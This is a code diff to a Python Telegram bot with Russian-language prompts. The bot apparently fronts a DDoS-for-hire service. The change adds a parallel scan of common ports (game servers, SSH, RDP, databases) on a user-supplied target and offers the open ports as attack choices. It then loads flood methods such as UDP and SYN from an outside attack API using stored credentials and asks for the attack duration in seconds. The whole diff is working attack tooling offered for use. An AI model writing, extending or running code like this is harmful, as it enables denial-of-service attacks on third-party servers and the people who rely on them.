@@ -3458,16 +3458,50 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token, _premium=premium, _max_time=max_time)
 			await bot_instance.answer_callback_query(call.id)
 
-		elif d.startswith('l4_m_'):
-			method = d[5:]
-			fsm_state = dp_instance.current_state(user=uid)
-			await fsm_state.update_data(_l4_method=method)
+		elif d.startswith('l4_port_'):
+			import base64 as _base64
+			port_val = int(d[8:])
+			await dp_instance.current_state(user=uid).update_data(_l4_port=port_val)
+			port_label = str(port_val) if port_val > 0 else "случайный"
+			# Грузим методы из Lotus API
+			methods = {}
+			try:
+				_auth2 = _base64.b64encode(f"{config.LOTUS_LOGIN}:{config.LOTUS_PASS}".encode()).decode()
+				async with aiohttp.ClientSession() as _s2:
+					async with _s2.get(
+						"https://api.fragment.bond/api/methods",
+						headers={"Authorization": f"Basic {_auth2}"},
+						timeout=aiohttp.ClientTimeout(total=8)
+					) as _r2:
+						if _r2.status == 200:
+							_d2 = await _r2.json()
+							methods = _d2.get("methods", {})
+			except Exception as _e2:
+				print(f"[L4] methods fetch: {_e2}")
+			if not methods:
+				methods = {"udp": "UDP", "syn": "SYN"}
+			mkp2 = types.InlineKeyboardMarkup(row_width=2)
+			for _mn in methods:
+				mkp2.add(types.InlineKeyboardButton(f"⚡ {_mn.upper()}", callback_data=f"l4_m_{_mn}"))
 			await bot_instance.send_message(
 				call.message.chat.id,
-				f"✅ *Метод:* `{method.upper()}`\n\n*Введите порт цели* (0 = случайный):\nПример: `80`, `443`, `25565`, `0`",
+				f"✅ *Порт:* `{port_label}`\n\n*Выберите метод атаки:*",
+				parse_mode="Markdown",
+				reply_markup=mkp2
+			)
+			await bot_instance.answer_callback_query(call.id)
+
+		elif d.startswith('l4_m_'):
+			method = d[5:]
+			fsm_data_l4 = await dp_instance.current_state(user=uid).get_data()
+			await dp_instance.current_state(user=uid).update_data(_l4_method=method)
+			max_time = fsm_data_l4.get('_max_time', 150)
+			await bot_instance.send_message(
+				call.message.chat.id,
+				f"✅ *Метод:* `{method.upper()}`\n\n*Введите время атаки в секундах* (макс. {max_time}):",
 				parse_mode="Markdown"
 			)
-			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.port.state)
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.time_dur.state)
 			await bot_instance.answer_callback_query(call.id)
 
 	except Exception as e:
@@ -4622,12 +4656,30 @@ async def profile_step1(message: types.Message, state: FSMContext):
 				pass
 
 
+_L4_SCAN_PORTS = [
+	(80, "HTTP"), (443, "HTTPS"), (8080, "HTTP-alt"), (8443, "HTTPS-alt"),
+	(22, "SSH"), (21, "FTP"), (25, "SMTP"), (3306, "MySQL"), (3389, "RDP"),
+	(25565, "Minecraft"), (19132, "MC Bedrock"), (27015, "Steam/CS"),
+	(30120, "FiveM"), (9987, "TeamSpeak"), (7777, "Game"),
+	(1194, "OpenVPN"), (5432, "PostgreSQL"), (6379, "Redis"),
+	(1433, "MSSQL"), (2302, "Arma"),
+]
+
+async def _scan_port(ip: str, port: int) -> bool:
+	try:
+		_, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=0.8)
+		writer.close()
+		try: await writer.wait_closed()
+		except: pass
+		return True
+	except:
+		return False
+
+
 @dp.message_handler(state=WaitL4FSM.target)
 async def l4_step_target(message: types.Message, state: FSMContext):
 	import socket as _socket
-	import base64 as _base64
 	uid = message.from_user.id
-	lang = await db.get_lang(uid)
 	fsm_data = await state.get_data()
 	_bot_token = fsm_data.get('_bot_token')
 	_bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
@@ -4635,7 +4687,7 @@ async def l4_step_target(message: types.Message, state: FSMContext):
 
 	# Резолвим домен в IP
 	ip = None
-	if raw.replace('.', '').replace(':', '').isdigit() or _is_valid_ip(raw):
+	if _is_valid_ip(raw):
 		ip = raw
 	else:
 		try:
@@ -4647,33 +4699,34 @@ async def l4_step_target(message: types.Message, state: FSMContext):
 
 	await state.update_data(_l4_ip=ip, _l4_domain=raw)
 
-	# Получаем методы из Lotus API
-	methods = {}
-	try:
-		_auth = _base64.b64encode(f"{config.LOTUS_LOGIN}:{config.LOTUS_PASS}".encode()).decode()
-		async with aiohttp.ClientSession() as s:
-			async with s.get(
-				"https://api.fragment.bond/api/methods",
-				headers={"Authorization": f"Basic {_auth}"},
-				timeout=aiohttp.ClientTimeout(total=8)
-			) as resp:
-				if resp.status == 200:
-					data = await resp.json()
-					methods = data.get("methods", {})
-	except Exception as e:
-		print(f"[L4] methods fetch error: {e}")
-
-	if not methods:
-		methods = {"udp": "UDP флуд", "syn": "SYN флуд"}
-
 	domain_str = f" (`{raw}`)" if raw != ip else ""
-	mkp = types.InlineKeyboardMarkup(row_width=2)
-	for m_name in methods:
-		mkp.add(types.InlineKeyboardButton(f"⚡ {m_name.upper()}", callback_data=f"l4_m_{m_name}"))
-
-	await _bot.send_message(
+	scan_msg = await _bot.send_message(
 		uid,
-		f"🎯 *Цель:* `{ip}`{domain_str}\n\n*Выберите метод атаки:*",
+		f"🎯 *Цель:* `{ip}`{domain_str}\n\n🔍 *Сканирую открытые порты...*",
+		parse_mode="Markdown"
+	)
+
+	# Сканируем порты параллельно
+	tasks = [_scan_port(ip, p) for p, _ in _L4_SCAN_PORTS]
+	results = await asyncio.gather(*tasks, return_exceptions=True)
+	open_ports = [(p, lbl) for (p, lbl), ok in zip(_L4_SCAN_PORTS, results) if ok is True]
+
+	mkp = types.InlineKeyboardMarkup(row_width=2)
+	if open_ports:
+		port_lines = "\n".join(f"• `{p}` — {lbl}" for p, lbl in open_ports)
+		for p, lbl in open_ports:
+			mkp.add(types.InlineKeyboardButton(f"{p} — {lbl}", callback_data=f"l4_port_{p}"))
+	else:
+		port_lines = "_Открытых портов не найдено_"
+
+	mkp.add(types.InlineKeyboardButton("🎲 Случайный порт", callback_data="l4_port_0"))
+
+	await _bot.edit_message_text(
+		f"🎯 *Цель:* `{ip}`{domain_str}\n\n"
+		f"*Открытые порты:*\n{port_lines}\n\n"
+		f"*Выберите порт для атаки:*",
+		chat_id=uid,
+		message_id=scan_msg.message_id,
 		parse_mode="Markdown",
 		reply_markup=mkp
 	)
@@ -4687,32 +4740,6 @@ def _is_valid_ip(s: str) -> bool:
 	except Exception:
 		return False
 
-
-@dp.message_handler(state=WaitL4FSM.port)
-async def l4_step_port(message: types.Message, state: FSMContext):
-	uid = message.from_user.id
-	fsm_data = await state.get_data()
-	_bot_token = fsm_data.get('_bot_token')
-	_bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
-	raw = message.text.strip()
-
-	try:
-		port = int(raw)
-		if port < 0 or port > 65535:
-			raise ValueError
-	except ValueError:
-		await _bot.send_message(uid, "❌ Неверный порт. Введите число от 0 до 65535:", parse_mode="Markdown")
-		return
-
-	await state.update_data(_l4_port=port)
-	max_time = fsm_data.get('_max_time', 150)
-	port_str = str(port) if port > 0 else "случайный"
-	await _bot.send_message(
-		uid,
-		f"✅ *Порт:* `{port_str}`\n\n*Введите время атаки в секундах* (макс. {max_time}):",
-		parse_mode="Markdown"
-	)
-	await state.set_state(WaitL4FSM.time_dur.state)
 
 
 @dp.message_handler(state=WaitL4FSM.time_dur)
